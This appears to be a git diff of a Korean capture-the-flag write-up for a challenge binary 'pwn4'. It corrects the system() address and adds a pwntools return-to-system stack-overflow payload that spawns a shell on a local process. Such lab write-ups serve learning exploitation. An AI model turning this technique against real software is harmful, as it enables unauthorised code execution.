@@ -48,7 +48,33 @@
 
 IDA로 '/bin/sh' 주소는 쉽게 알 수 있었다. (**0x084a038**)
 
-![image](https://user-images.githubusercontent.com/59410565/117292554-51cd9400-aeab-11eb-9968-df02ab65988e.png)
+![image](https://user-images.githubusercontent.com/59410565/117446939-cb32b880-af77-11eb-9757-cd8b18a9fe37.png)
 
-system의 주소 또한 IDA를 통해 알 수 있었다. (**0x0804a01c**)
+system의 주소 또한 IDA를 통해 알 수 있었다. (**0x08048430**)
 
+
+
+- Payload
+
+```python
+from pwn import *
+
+p = process('./pwn4')
+
+system = 0x08048430
+binsh = 0x0804a038
+
+payload = 'A'*32 
+payload += p32(system)
+payload += 'BBBB'
+payload += p32(binsh)
+
+p.sendafter("> ", payload)
+p.interactive()
+```
+
+
+
+- Exploit
+
+![image](https://user-images.githubusercontent.com/59410565/117450673-83faf680-af7c-11eb-8709-1d35fe46ea5b.png)
